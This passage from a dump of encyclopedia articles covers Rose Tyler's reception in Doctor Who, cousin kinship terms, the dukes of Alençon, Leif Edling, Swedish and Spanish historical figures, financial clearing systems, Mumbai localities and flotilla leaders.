Dalek shooting the male lead. He had difficulty splitting up the characters for a second time for the necessity of the plot. He felt that &quot;Rose has to be stupid to fall in love with Doctor #2&quot; because &quot;she&#x27;s doing what the plot demands, not what she&#x27;d demand&quot;. At one stage he considered giving an explanation that Rose&#x27;s dimension hopping and the Dalek&#x27;s meddling with reality had contaminated her with &quot;voidstuff&quot; and that she would die if she stayed in her original universe. In the final episode, it is enough for her to stay that the human Doctor needs her and is able to reciprocate her love. Porter felt that the climax of &quot;Journey&#x27;s End&quot; indicated that &quot;Rose&#x27;s role as a sidekick has been completed&quot; as she has a second Doctor to humanise, one who she can be equals with.

===Reprisals===
Though Davies had intended the serial to end with the Tenth Doctor visiting his former companions, he struggled with how to include Rose. An initial idea was for Rose to appear with the Meta-Crisis Doctor and their family in the parallel universe, where both would sense the original Tenth Doctor regenerating. However, Davies felt this would raise too many questions about their lives in the parallel universe. Davies&#x27;s successor as executive producer, Steven Moffat, felt that Davies ended Rose&#x27;s story in the perfect way by choosing to take it back to the beginning of her acquaintance with the Doctor. Piper&#x27;s return for &quot;Doctor Who&quot;″s 50th anniversary episode was confirmed in March 2013. Moffat wished to include Piper in the episode because he felt that she symbolised the rebirth of &quot;Doctor Who&quot;. As he did not feel comfortable adding to Davies&#x27;s story arc, he chose to re-introduce her Bad Wolf persona instead. During the episode Piper&#x27;s character has dialogue solely with John Hurt&#x27;s War Doctor, and is unseen by the other characters, including the Tenth Doctor. Reviewers noted similarities between the characterisation of Bad Wolf Rose and that of a plot device used by Charles Dickens in his 1843 novella &quot;A Christmas Carol&quot;. Ted B. Kissell, a journalist for &quot;The Atlantic&quot; likened the War Doctor to Ebenezer Scrooge and dubbed Rose the &quot;Ghost of Doctors Yet to Come&quot;.

==Reception==

After a preview of the first series, &quot;The Guardian&quot;″s Owen Gibson described Rose as &quot;newly empowered&quot; and a &quot;go-getting teen in the &quot;Buffy the Vampire Slayer&quot; mould.&quot; Ahead of the series premiere on Australian Network ABC &quot;The Sydney Morning Herald&quot;″s Robin Oliver described Rose&#x27;s role in the series as being &quot;more the Doctor&#x27;s equal than previous companions&quot; and that this was &quot;no mean achievement against Eccleston&#x27;s acting skills.&quot; Seventh Doctor actor Sylvester McCoy opined that Piper was &quot;wonderful in the role&quot; and the relationship between her and the Doctor was &quot;quite extraordinary&quot;. Porter suggests in her analysis of Rose that the romance between her and the Doctor widened the demographic appeal of the series. She claims that the love story &quot;simmers enough below the surface that adults, especially women who find Time-Lords sexy, watched the series for Rose&#x27;s interplay with the Doctor&quot;. In their book &quot;Who is the Doctor?&quot;, Graeme Burk and Robert Smith described the climactic kiss between the Ninth Doctor and Rose in &quot;The Parting of the Ways&quot; as being something &quot;we all secretly wanted, even though it ultimately killed him&quot;. Peter Davison, who portrayed the Fifth Doctor, also felt that allowing the Doctor and his companion to have sexual tension ultimately allowed for more rounded characterisation. He believed that Rose was the first example of the production team creating a well-written companion.

Burk and Smith found the pairing of the Doctor and Rose to be unlikable in the episode &quot;Tooth and Claw&quot; because they were &quot;acting like smug idiots&quot;. However, they noted that &quot;fortunately there are consequences: the season arc gets kicked off as a direct result of the Doctor and Rose being so irritating&quot;. Harry Venning of &quot;The Stage&quot; commented that the eventual parting scene between Rose and the Doctor in &quot;Doomsday&quot; was &quot;beautifully written and movingly played,&quot; with &quot;not a dry eye in the universe&quot;. Burk and Smith singled out Piper&#x27;s performance in the episode for special praise stating she &quot;is astonishing at capturing the reality of someone whose world suddenly, finally collapses.&quot; Remarking on Piper&#x27;s departure, Dek Hogan of Digital Spy stated that &quot;Billie Piper&#x27;s energy has undoubtedly been one of the reasons that this revival has been so successful and the difficult third series will be so much more so without her.&quot; Stephen Brook of &quot;The Guardian&quot; commented that &quot;the departure of the much-loved Rose ...  was brilliantly handled and completely unexpected.&quot;

Stephen James Walker, a writer of reference works on &quot;Doctor Who&quot;, gave an unfavourable review to Rose&#x27;s return in &quot;Turn Left&quot; in his &quot;unauthorised guide to &quot;Doctor Who&quot;&#x27;s fourth series,&quot; &quot;Monsters Within&quot;. He thought that Billie Piper was &quot;distinctly below par&quot;, citing her gaunt and malnourished appearance, new hairstyle, and slight lisp as reasons why her acting was not her finest. He criticised her role in the episode, stating it had been &quot;far less well worked out&quot; than Donna&#x27;s. Ben Rawson-Jones of Digital Spy also noted a change in Piper&#x27;s enunciation; he compared her accent to &quot;[having] her mouth numbed with local anaesthetic&quot;. In Rawson-Jones&#x27; review of the series finale he notes that whilst having the Doctor and Rose &#x27;cop off&#x27; would be divisive with the shows audience, &quot;Davies wisely managed to please both parties&quot; by pairing her off with a human Doctor instead. However, IGN&#x27;s Travis Fickett reacted unfavourably towards Rose&#x27;s return and her pairing with the part human Doctor. He thought that it undermined her &quot;perfect send off&quot; in &quot;Doomsday&quot; as she was on the sidelines for much of &quot;Journey&#x27;s End&quot;, and her ending up with the part human, part Time Lord Doctor &quot;feels like an insult to the character&quot;. Io9&#x27;s Charlie Jane Anders also reacted unfavourably to Rose returning and wrote &quot;it was pretty clear that she was only there so she could get her pet faux-Doctor at the end.&quot;

Reviewers generally reacted positively to Piper&#x27;s 2013 appearance in the 50th anniversary episode &quot;The Day of the Doctor&quot;. Ben Lawrence of &quot;The Daily Telegraph&quot; called her performance as the &quot;Bad Wolf&quot; Rose &quot;transfixing&quot;. Neela Debnath of &quot;The Independent&quot; praised the chemistry between Hurt and Piper and compared Piper&#x27;s performance to Suranne Jones&#x27; portrayal of the TARDIS in &quot;The Doctor&#x27;s Wife&quot; describing it as &quot;slightly eccentric&quot;, &quot;oddball&quot; and &quot;off-the-wall&quot;. Daniel Martin of &quot;The Guardian&quot; praised Steven Moffat&#x27;s decision not to extend Rose Tyler&#x27;s story or re-unite her with the Tenth Doctor. He called Piper &quot;a true and unending legend of &quot;Doctor Who&quot;&quot; and stated that &quot;her wise rendition of the Bad Wolf avatar made a passable stab at the stealing of the show&quot;.

Geoff Boucher of the &quot;Los Angeles Times&quot; named Rose the ninth best sidekick of all time, referring to her as &quot;the saucy and smart character who was key to the success of the Russell T Davies relaunch of &quot;Doctor Who&quot; in 2005&quot;. She was named the best &quot;Doctor Who&quot; companion by Digital Spy in 2011, who opined that she worked best alongside the Ninth Doctor. In 2006 she was voted best companion by readers of &quot;Doctor Who Magazine&quot;. In an online poll in late 2010 conducted by the &quot;Radio Times&quot;, with over 3,000 participants, Rose was again voted the most popular companion. She retained this position in a 2013 poll conducted ahead of Doctor Who&#x27;s 50th anniversary, which had over 21,000 respondents, with 25.09% of the vote. In a 2012 poll conducted by BBC America with over 200,000 participants, Rose was voted &quot;The Greatest Woman of Doctor Who.&quot; Both &quot;The Daily Telegraph&quot; Gavin Fuller and Daniel Martin of &quot;The Guardian&quot; rated her as the second-best female companion behind Sarah Jane Smith. In 2012 Will Salmon of &quot;SFX&quot; magazine listed Rose&#x27;s original exit as the greatest companion departure in the history of &quot;Doctor Who&quot; as he felt it &quot;impossible not to be moved by the sudden severance of their relationship&quot;. In 2014 &quot;Radio Times&quot; organized the most massive online (over 2 million respondents) poll which featured every companion since 1963, beating the main сompetitors Jack Harkness and River Song, Rose was crowned &quot;Companion Champion&quot;.

At the 2005 National Television Awards, Billie Piper won the &quot;Most Popular Actress&quot; award for her role as Rose. In the BBC Online &quot;Best of Drama&quot; poll in 2005 Piper won the Best Actress category with 59.76% of the vote. She was also voted the Most Desirable Star with 26.47%. In January 2006 she was awarded the Breakthrough Award for Rising British Talent at &quot;The South Bank Show&quot; Awards. Piper again won the Most Popular Actress category at the 2006 National Television Awards for her work on the second series of &quot;Doctor Who&quot;. In September 2006, Piper was named Best Actress at the TV Quick and TV Choice Awards. &quot;Radio Times&quot;″s Tom Cole discussed the importance of &quot;Doctor Who&quot; in boosting Piper&#x27;s career in an article on how former &quot;Doctor Who&quot; actors can now expect more than &quot;a life of signing autographs at provincial sci-fi conventions.&quot; He notes that Piper&#x27;s portrayal of Rose &quot;firmly cemented her credentials as an actress&quot; and cited the variety of roles she had taken on since leaving the show as proof that &quot;as far as post-&quot;Who&quot; careers go, they don&#x27;t get much healthier than Billie&#x27;s.&quot;

<text>A cousin is a relative that is the child of a parent&#x27;s sibling; this is more specifically referred to as a first cousin. 

More generally, in the kinship system used in the English-speaking world, a cousin is a type of relationship in which relatives are two or more generations away from their most recent common ancestor. For this definition degrees and removals are used to further specify the relationship.

Degree measures how distant the relationship is from the most recent common ancestor(s). If the cousins do not come from the same generation, removal is specified, as removal measures the difference in generations between the two cousins. When the removal is not specified, no removal is assumed.

Various governmental entities have established systems for legal use that can precisely specify kinship with common ancestors any number of generations in the past; for example, in medicine and in law, a first cousin is a type of third-degree relative.

==Basic definitions==
People are related with a type of cousin relationship if they share a common ancestor, and are separated from their most recent common ancestor by two or more generations. This means neither person is an ancestor of the other, they do not share a parent (are not siblings), and neither is a sibling of the other&#x27;s parent (are not the other&#x27;s aunt/uncle nor niece/nephew). In the English system the cousin relationship is further detailed by the concepts of &quot;degree&quot; and &quot;removal&quot;.

The &quot;degree&quot; is the number of generations subsequent to the common ancestor before a parent of one of the cousins is found. This means the degree is the separation of the cousin from the common ancestor less one. Also, if the cousins are not separated from the common ancestor by the same number of generations, the cousin with the smallest separation is used to determine the degree. The &quot;removal&quot; is the difference between the number of generations from each cousin to the common ancestor. Two people can be removed but be around the same age due to differences in birth dates of parents, children, and other relevant ancestors.

==Additional terms==

* The terms &quot;full cousin&quot; and are used to specify a first cousin with no removals.
* The terms &quot;cousin-uncle/aunt&quot; and &quot;cousin-niece/nephew&quot; are sometimes used to describe the direction of the removal of the relationship, especially in Mennonite, Indian, and Pakistani families. These terms relate to a first cousin once removed, uncle/aunt referring to an older generation and niece/nephew for younger ones. For additional removals grand/great are applied to these relationships. For example, a cousin-granduncle is a male first cousin twice removed that comes from an older generation, and a cousin-grandniece is a female first cousin twice removed who comes from a younger generation. 
* The term is sometimes used for the grandchild of a first cousin, or the first cousin of a grandparent: a first cousin twice removed.
* The term &quot;kissing cousin&quot; is sometimes used for a distant relative who is familiar enough to be greeted with a kiss.

===Gender-based distinctions===

A maternal cousin is a cousin that is related to the mother&#x27;s side of the family, while a paternal cousin is a cousin that is related to the father&#x27;s side of the family. This relationship is not necessarily reciprocal, as the maternal cousin of one person could be the paternal cousin of the other. In the example Basic family tree, Emma is David&#x27;s maternal cousin and David is Emma&#x27;s paternal cousin.

On the other hand, parallel and cross cousins are reciprocal relationships. Parallel cousins are descended from same-sex siblings. A parallel first cousin relationship exists when both the subject and relative are maternal cousins, or both are paternal cousins. Cross cousins are descendants from opposite-sex siblings. A cross first cousin relationship exists when the subject and the relative are maternal cousin and paternal cousin to each other. In the basic family tree example, David and Emma are cross cousins.

===Multiplicities===

Double cousins are relatives who are cousins from two different branches of the family tree. This occurs when siblings, respectively, reproduce with different siblings from another family. This may also be referred to as &quot;cousins on both sides&quot;. The resulting children are related to each other through both their parents and are thus doubly related. Double first cousins share both sets of grandparents.


Half cousins are descended from half siblings and would share one grandparent. The children of two half siblings are first half cousins. If half siblings have children with another pair of half siblings, the resulting children would be double half first cousins and would share one grandparent on each side.

While there is no agreed upon term, it is possible for cousins to share three grandparents if a pair of half siblings had children with a pair of full siblings.

===Non-blood relations===

Step-cousins are either stepchildren of an individual&#x27;s aunt or uncle, nieces and nephews of one&#x27;s step-parent, or the children of one&#x27;s parent&#x27;s step-sibling. A cousin-in-law is the cousin of one&#x27;s spouse or the spouse of one&#x27;s cousin.

==Consanguinity==

Consanguinity is a measure of how closely individuals are related to each other. It is measured by the coefficient of relationship. Below, when discussing the coefficient of relationship, we assume the subject and the relative are related only through the kinship term. A coefficient of one represents the relationship one has with oneself. Consanguinity decreases by half for every generation of separation from the most recent common ancestor, as there are two parents for each child. When there is more than one common ancestor, the consanguinity between each ancestor is added together to get the final result.

Between first cousins, there are two shared ancestors each with four generations of separation, up and down the family tree: formula_1; their consanguinity is one-eighth. For each additional removal of the cousin relationship, consanguinity is reduced by half, as the generations of separation increase by one. For each additional degree of the cousin relationship, consanguinity is reduced by a quarter as the generations of separation increase by one on both sides.

Half cousins have half the consanguinity of ordinary cousins as they have half the common ancestors (i.e. one vs two). Double cousins have twice the consanguinity of ordinary cousins as they have twice the number of common ancestors (i.e. four vs two). Double first cousins share the same consanguinity as half-siblings. Likewise, double half cousins share the same consanguinity as first cousins as they both have two common ancestors. If there are half-siblings on one side and full siblings on the other, they would have three-halves the consanguinity of ordinary first cousins.

In a scenario where two monozygotic (identical) twins have children with another pair of monozygotic twins, the resulting double cousins would test as genetically similar as siblings.

===Cousin marriage===

Cousin marriage is important in several anthropological theories, which often differentiate between matriarchal and patriarchal parallel and cross cousins.

Currently about 10% and historically as high as 80% of all marriages are between first or second cousins. Cousin marriages are often arranged. Anthropologists believe it is used as a tool to strengthen the family, conserve its wealth, protect its cultural heritage, and retain the power structure of the family and its place in the community. Some groups encourage cousin marriage while others attach a strong social stigma to it. In some regions in the Middle East, more than half of all marriages are between first or second cousins (in some of the countries in this region, this may exceed 70%). Just outside this region, it is often legal but infrequent. Many cultures have encouraged specifically cross-cousin marriages. In other places, it is legally prohibited and culturally equivalent to incest. Supporters of cousin marriage often view the prohibition as discrimination, while opponents claim potential immorality.

===Reproduction===

Couples that are closely related have an increased chance of sharing genes, including mutations that occurred in their family tree. If the mutation is a recessive trait, it will not reveal itself unless both father and mother share it. Due to the risk that the trait is harmful, children of high-consanguinity parents have an increased risk of recessive genetic disorders. 

Research has indicated that related couples have more children - a study of Icelandic couples concluded that those related with consanguinity equivalent to that of third cousins have the greatest reproductive success. This seems counterintuitive as closely related parents have a higher probability of having offspring that are unfit, yet closer kinship can also decrease the likelihood of immunological incompatibility during pregnancy.

This risks of inbreeding - particularly through common practice of cousin marriage - extend beyond the immediate descendants of those involved. Sustained cousin marriage within a population group over generations eventually leads to inbreeding at the population level and the rise of genetic disorders that affects the entire population, not just those in cousin marriages. Increased genetic literacy within a population can lead to a reduction in cousin marriage.

<text>Several counts and then royal dukes of Alençon have figured in French history. The title has been awarded to a younger brother of the French sovereign.

==History==
The first line of Counts of Alençon came from the House of Belleme, who ruled from the 10th to the early 13th centuries. Alençon was granted as an appanage to Peter, son of Louis IX of France, and then to Charles, count of Valois, brother of Philip IV (1293). A third house of Alençon counts descended from Charles, second son of the Count of Valois, who was killed at the Battle of Crécy in 1346.

The county of Alençon was raised to a dukedom in 1414. Jean, 1st Duc d&#x27;Alençon, was killed at Agincourt, 1415, after having with his own hand slain the Duke of York. His son, Jean, 2nd Duc d&#x27;Alençon (who features in Shakespeare&#x27;s &quot;Henry VI)&quot;, was dispossessed of his duchy in the Battle of Verneuil on 17 August 1424: the Duke was defeated and taken prisoner by English forces led by John, Duke of Bedford. Jean reconquered his domain in 1449.

In 1524 the dukedom of Alençon reverted to the crown, in consequence of the death of the childless Duke Charles IV, who was married to Marguerite, sister of Francis I; Marguerite appears to have kept the title for life, as her second husband, Henry II of Navarre, used it in 1540. The title was given as a jointure to Catherine de&#x27; Medici in 1559, and as an appanage to her youngest son Francis in 1566.

The title was pawned by Henry IV to the duke of Wūrttemberg, and subsequently it passed to Gaston, Duke of Orléans, by grant of Louis XIII; to Elizabeth of Orléans, duchess of Guise; to Charles, duke of Berry, grandson of Louis XIV (1710); and to Monsieur (later Louis XVIII), brother of Louis XVI.

The title of duc d&#x27;Alençon was last given to Ferdinand of Orléans, son of the duc de Nemours, and grandson of Louis-Philippe.

<text>Leif Edling (born 6 August 1963) is a Swedish musician, best known as the bassist, main songwriter and one of the founding members of the doom metal band Candlemass. He is the only constant member of the band since its inception to the present day. Nevertheless, since the band&#x27;s second reunion in 2002 Edling has been backed up again by founding rhythm guitarist Mats Björkman, who had been absent from 1997 to 2002.

==Biography==
Edling started his musical career in the band Trilogy, then under the name of Toxic, as a singer together with Ian Haugland (later the drummer of Europe) in 1979. He then played in a band named Witchcraft but left in 1981 and formed Nemesis in 1982. Before the Candlemass official releases, Edling also handled vocal duties in addition to playing bass.

After the departure of Messiah Marcolin, Candlemass became his solo project, until the band reformed in 2002. In 1994, when Candlemass fell apart, Leif had started the band Abstrakt Algebra with Mats Levén on vocals and Mike Wead on guitar. The band met with limited success and disbanded after one album.

In 2002, he founded another doom metal band, named Krux, also with Mats Levén on vocals, and in 2013 founded Avatarium with Marcus Jidell on guitar and Jidell&#x27;s wife, Jennie-Ann Smith on vocals.

Since early 2014, Edling had been unable to tour with either Candlemass or Avatarium due to unspecified health problems, though believed to be chronic fatigue syndrome. A variety of replacement members were used, including Grave/Entombed bassist Jörgen Sandström and keyboard player Per Wiberg switching to bass. He has returned to performing with the band as of 2019.

<text>The Spanish Communist Party (in ), was the first communist party in Spain, formed out of the Federación de Juventudes Socialistas (Federation of Socialist Youth, youth wing of Spanish Socialist Workers&#x27; Party). The founders of the party, that had belonged to the left-wing within the FJS, included Ramón Merino Gracia, Eduardo Ugarte, Pedro Illescasm Luis Portela, Tiburicio Pico, and Rito Estaban. Partido Comunista Español was formed on April 15, 1920. Its organ was called &quot;El Comunista&quot;.

Soon after its formation, on November 14, 1921, the party merged with Partido Comunista Obrero Español (Spanish Communist Workers&#x27; Party) and formed the Communist Party of Spain.

<text>Leonard Gyllenhaal (3 December 1752 – 13 May 1840) was a Swedish nobleman, military officer and entomologist.

== Early life and ancestry ==
Born on the Ribbingsberg manor in Västergötland in west Sweden, Leonard Gyllenhaal was son of Hans Reinhold Gyllenhaal (1724–1796), an army officer, by his wife, Anna Catharina Wahlfelt (1723–1799). By birth, he belonged to a Gyllenhaal family, which was part of the Swedish nobility.

== Biography ==
He went to school &quot;Skara trivialskola&quot; in the cathedral town of Skara together with, among others, the future poet Johan Henrik Kellgren, and later renowned naturalists Anders Dahl and the brothers Adam and Johan Afzelius, with whom he went on natural excursions. Like some of his friends, he went to Uppsala to study under Linnaeus in 1769. He never matriculated and remained in Uppsala only one semester, before switching to a military career in accordance with the wishes and traditions of the family, enrolling in the &quot;Adelsfanan&quot; (&quot;Banner of Nobles&quot;) cavalry regiment, and a few years later transferring to the drabantkåren (Garde du Corps). Gyllenhaal, however, remained in contact with Linnaeus through an extensive correspondence and continued to work as an amateur naturalist.

He remained in military service until 1799, when he retired with the rank of major. As this did not take all of his time – different detachments of the Garde du Corps served at the royal court for only brief periods each year – he worked on his father&#x27;s estate Höberg in Norra Vånga parish in Västergötland, which he managed on his own from 1784. He developed the estate, experimenting with new crops such as the American maize.

His main interest ever since youth was entomology, and already in 1775 he had collected some 1300 largely unidentified beetle species from the western part of Götaland. He built a private entomological museum, library and study on Höberg which he called the &quot;Fly house&quot;. At his death, he had a collection of 400 boxes of prepared and identified insects, which he left to the Royal Swedish Society of Sciences in Uppsala (later deposited at the Uppsala University Museum of Zoology). His main publication was the &quot;Insecta Suecica&quot;, describing the insects of Sweden, which took him 30 years to complete and was awarded the gold medal of the Academy of Sciences. Another claim to fame for Gyllenhaal is the fact that he named the common beetle family of Histeridae. He was also elected an honorary member of the French Société entomologique. He was appointed a Knight of the Royal Order of Vasa.
Leonard Gyllenhaal was a leading Swedenborgian who supported the printing and spreading of Swedenborg&#x27;s writings. 

== Marriage and issue ==
He was married to Anna Hård af Torestorp (1763-1845), the only child of Gustaf Ulrik Hård af Torestorp (1728-1800) and his wife, Baroness Eleonore Margarethe Fleetwood (1738-1770), great-granddaughter of Swedish general Baron George Fleetwood and Brigitta Gyllenstierna (1606-1653). They had six sons and five daughters. His grandson, the Swedish-American journalist Anders Leonard Gyllenhaal (1842–1905), retained the faith of his grandfather and was a member of the Swedenborgian New Church. His descendants in the American branch of the family include the actor siblings Jake and Maggie Gyllenhaal.

<doc id="1341179" wikidata="Q1099549" url="?curid=1341179" title="Clearing (finance)">
<text>In banking and finance, clearing refers to all activities from the time a commitment is made for a transaction until it is settled. This process turns the promise of payment (for example, in the form of a cheque or electronic payment request) into the actual movement of money from one account to another. Clearing houses were formed to facilitate such transactions among banks.

==Description==
In trading, clearing is necessary because the speed of trades is much faster than the cycle time for completing the underlying transaction. It involves the management of post-trading, pre-settlement credit exposures to ensure that trades are settled in accordance with market rules, even if a buyer or seller should become insolvent prior to settlement. Processes included in clearing are reporting/monitoring, risk margining, netting of trades to single positions, tax handling, and failure handling.

Systemically important payment systems (SIPS) are payment systems which have the characteristic that a failure of these systems could potentially endanger the operation of the whole economy. In general, these are the major payment clearing or real-time gross settlement systems of individual countries, but in the case of Europe, there are certain pan-European payment systems. T2 is a pan-European SIPS dealing with major inter-bank payments. STEP2, operated by the Euro Banking Association is a major pan-European clearing system for retail payments which has the potential to become a SIPS. In the United States, the Federal Reserve System is a SIPS.

==History==
===Cheque clearing===
The first payment method that required clearing was cheques, as cheques would have to be returned to the issuing bank for payment.

Though many debit cards are drawn against chequing accounts, direct deposit and point-of-purchase electronic payments are cleared through networks separate from the cheque clearing system (in the United States, the Federal Reserve&#x27;s Automated Clearing House and the private Electronic Payments Network).

===Securities and derivatives clearing===

Securities clearing was required to ensure payment had been received and the physical stock certificate delivered. This caused a few days’ delay between the trade date and final settlement. To reduce the risk associated with failure to deliver on the trade on settlement date, a clearing agent or clearing house often sat between the trading parties. The trading parties would deliver the physical stock certificate and the payment to the clearing house, who would then ensure the certificate was handed over and the payment complete. This process is known as delivery versus payment.

During the 1700s the Amsterdam Stock Exchange had close links with the London Stock Exchange, and the two would often list each other&#x27;s stocks. To clear the trades, time was required for the physical stock certificate or cash to move from Amsterdam to London and back. This led to a standard settlement period of 14 days, which was the time it usually took for a courier to make the journey between the two cities. Most exchanges copied the model, which was used for the next few hundred years. With the advent of the computer in the 1970s and 1980s, there was a move to reduce settlement times in most exchanges, leading by stages to a current standard of one day, known as T+1.

With the advent of electronic settlement, and a move to dematerialisation of securities, standardised clearing systems were required, as well as standardised securities depositories, custodians and registrars. Until this point, many exchanges would act as their own clearing house, however the additional computer systems required to handle large volumes of trades, and the opening of new financial markets in the 1980s, such as the 1986 big bang in the UK, led to a number of exchanges separating or contracting the clearing and settlement functions to dedicated organisations.

In some specialist financial markets, clearing had already been separate from trading. One example was the London Clearing House (later renamed LCH.Clearnet), which, since the 1950s, cleared derivatives and commodities for a number of London exchanges. Clearing houses who clear financial instruments, such as LCH, are generally called central counterparties (CCPs).

In the wake of the financial crisis of 2007–08 the G20 leaders agreed at the 2009 Pittsburgh Summit that all standardised derivatives contracts should be traded on exchanges or electronic trading platforms and cleared through central counterparties (CCPs). Although some derivatives were already traded on exchange and cleared, many over-the-counter derivatives that met the criteria needed to be novated to CCPs as a result.

== United States clearing system ==
The United States clearing system, known as CHIPS, is the largest clearing system in the world. Millions of transactions, valued in the trillions of dollars, are conducted between sellers and purchasers of goods, services, or financial assets daily. Most of the payments making up the transactions flow between several banks, most of which maintain accounts with the Federal Reserve banks. The Federal Reserve therefore performs an intermediary role, clearing and settling international bank payments. Prior to the completion of the clearing, the banks settle payment transactions by debiting the accounts of the depository institutions, while crediting the accounts of depository institutions receiving the payments.

The Fedwire Funds Service provides a real-time gross settlement system in which more than 9,500 participants are able to initiate electronic funds transfers that are immediate, final, and irrevocable. Depository institutions that maintain an account with a Reserve Bank are eligible to use the service to send payments directly to, or receive payments from, other participants. Depository institutions can also use a correspondent relationship with a Fedwire participant to make or receive transfers indirectly through the system. Participants generally use Fedwire to handle large-value, time-critical payments, such as payments to settle interbank purchases and sales of federal funds; to purchase, sell, or finance securities transactions; to disburse or repay large loans; and to settle real estate transactions. The Department of the Treasury, other federal agencies, and government-sponsored enterprises also use the Fedwire Funds Service to disburse and collect funds. In 2003, the Reserve Banks processed 123 million Fed-wire payments having a total value of $436.7 trillion.

The Fedwire Securities Service (FSS) provides safekeeping, transfer, and settlement services for securities issued by the Treasury, federal agencies, government-sponsored enterprises, and certain international organizations. The Reserve Banks perform these services as fiscal agents for these entities. Securities are safekept in the form of electronic records of securities held in custody accounts. Securities are transferred according to instructions provided by parties with access to the system. Access to the FSS is limited to depository institutions that maintain accounts with a Reserve Bank, and a few other organizations, such as federal agencies, government-sponsored enterprises, and state government treasurer’s offices (which are designated by the U.S. Treasury to hold securities accounts). Other parties, specifically brokers and dealers, typically hold and transfer securities through depository institutions that are Fedwire participants and that provide specialized government securities clearing services. In 2003, the Fedwire Securities Service processed 20.4 million securities transfers with a value of $267.6 trillion.

The ACH Network is an electronic payment system, developed jointly by the private sector and the Federal Reserve in the early 1970s as a more efficient alternative to checks. Since then, the ACH has evolved into a nationwide mechanism that processes credit and debit transfers electronically. ACH credit transfers are used to make direct deposit payroll payments and corporate payments to vendors. ACH debit transfers are used by consumers to authorize the payment of insurance premiums, mortgages, loans, and other bills from their account. The ACH is also used by businesses to concentrate funds at a primary bank and to make payments to other businesses. In 2003, the Reserve Banks processed 6.5 billion ACH payments with a value of $16.8 trillion.

<text>Currey Road (station code: CRD) is a railway station that serves the Lower Parel neighbourhood in Mumbai. It is on the Central line of the Mumbai Suburban Railway serving the areas of Lalbaug and Parel.

Currey Road is situated in central Mumbai and is surrounded by famous places like Lalbaug, Lower Parel. There is a flyover (constructed in 1915) which constitutes the biggest part of Currey Road. The Railway station divides the road into two major parts, East and West.

Currey Road Station was originally built to carry horses during the British Raj. During the derby (horse race) season, a special train used to carry horses from the race course to the stud farms in Poona.

<text>New Panvel is a residential, commercial and educational node of Navi Mumbai, Raigad District, Maharashtra and comes under the Konkan division. New Panvel was developed on marshy land and was previously a Mango cultivated area. New Panvel is divided into two parts: New Panvel (E), on the eastern side of Panvel railway station and Khanda Colony or New Panvel (W) on the western side of it. Both parts of New Panvel are connected by a flyover bridge also known as Khanda Colony Flyover. New Panvel (W) is also popularly called &quot;Khanda Colony&quot; by the local villagers, as the city is adjacent to two small villages Dhakta Khanda and Motha Khanda (Greater Khanda).

Khanda and Khandeshwar Railway stations derive their names from a very old Shiva Temple known as Khandeshwar Mahadev along the sides of the lake of Khandeshwar. The locals are host the Mahashivratri festival on the banks of the Khandeshwar lake every year. Takka Naka is a new node of New Panvel being developed by CIDCO. Major commercial activities are present in sectors 15 to 19 just outside the railway station on the eastern side. K Mall is a shopping center in New Panvel&#x27;s, Takka Naka node while Orion Mall along the Mumbai-Pune highway beside the Panvel Bus depot is emerging as a shopping destination in town.

The planned Navi Mumbai International Airport is expected to affect real estate prices in the surrounding area of New Panvel which are under development. Sector 17 of New Panvel West bound by JNPT bypass and NH-4 alongside &quot;Motha Khanda&quot; is located near the railway station. A few residential buildings in New Panvel West come under the &quot;A Type&quot; CIDCO settlements, offer budget housing for lower income groups.

New Panvel, being developed by CIDCO, has well planned and wide lane major roads and even the arterial roads are of two lanes. Old Panvel has relatively less maintained roads which are very congested due to lack of planning on part of the PMC.

=== Proposed airport ===

The new Navi Mumbai International Airport, which is to come up around the Panvel-Kopra area, would be built through public-private partnership (PPP) — with private sector partner getting 74% equity while Airport Authority of India (AAI) and Maharashtra government through CIDCO holding 13% each. The International Civil Aviation Organisation (ICAO) has already given techno-feasibility clearance to the Navi Mumbai airport and central cabinet has cleared it.

The airport site is located in an area of 1160 hectares accommodating two parallel runways for simultaneous &amp; independent operations with provision of full length taxi ways on either side of the runways. The airfield has been designed to accommodate the new large aircraft compatible with International Civil Aviation Organisation (ICAO) Aerodrome Code 4F.

In addition, Panvel handles 116 suburban trains that are connected to Mumbai CST, Wadala Road, Andheri and Thane.

Panvel is a major station and is considered equivalent to Mumbai&#x27;s stations for trains which skip Mumbai. The trains run on diesel traction and alternating current (the tracks to Konkan are not electrified south of Panvel), and Panvel is a refueling point for their locomotives. In addition to refueling, Panvel has a huge number of parcel bookings, and most trains stop for periods varying from 5 minutes to 20 minutes for technical purposes. Panvel also handles crew and locomotive change for long-distance passenger / freight trains. Panvel railway station also has siding for suburbs trains located in New Panvel (W) and for locomotives in New Panvel (E). There are two railway stations in the node.

<doc id="1341214" wikidata="Q1430303" url="?curid=1341214" title="Flotilla leader">
<text>A flotilla leader was a warship of late 19th century and early 20th century navies suitable for commanding a flotilla of destroyers or other small warships, typically a small cruiser or a large destroyer (known as a destroyer leader). The flotilla leader provided space, equipment and staff for the flotilla commodore (who typically held the rank of captain), including a wireless room, senior engineering and gunnery officers, and administrative staff to support the officers. Originally, older light or scout cruisers were often used, but in the early 1900s, the rapidly increasing speed of new destroyer designs meant that such vessels could no longer keep pace with their charges. Accordingly, large destroyer designs were produced for use as leaders.

As destroyers changed from specialized anti-torpedo boat vessels that operated in squadrons to larger multi-purpose ships that operated alone or as leaders of groups of smaller vessels, and as command and control techniques improved (and the technology became more readily available), the need for specialized flotilla leaders decreased and their functions were adopted by all destroyers. The last specialized flotilla leader to be built for the Royal Navy was HMS &quot;Inglefield&quot;, launched in 1936. Subsequent leaders used the same design as the private ships of the class, with minor detailed changes to suit them to their role. In the Royal Navy, the flotilla leader and commanding officer were known as Captain (D). In the Royal Navy, flotilla leaders and divisional leaders could be identified by particular coloured bands painted on their funnels.

<doc id="1341215" wikidata="Q1974660" url="?curid=1341215" title="Gyllenhaal family">
<text>The Gyllenhaal family () is a Swedish noble family descended from cavalry officer Lieutenant Nils Gunnarsson Haal (died 1680 or 1681), ennobled in 1652 with a change of name to &quot;Gyllenhaal&quot;.

== Family name ==
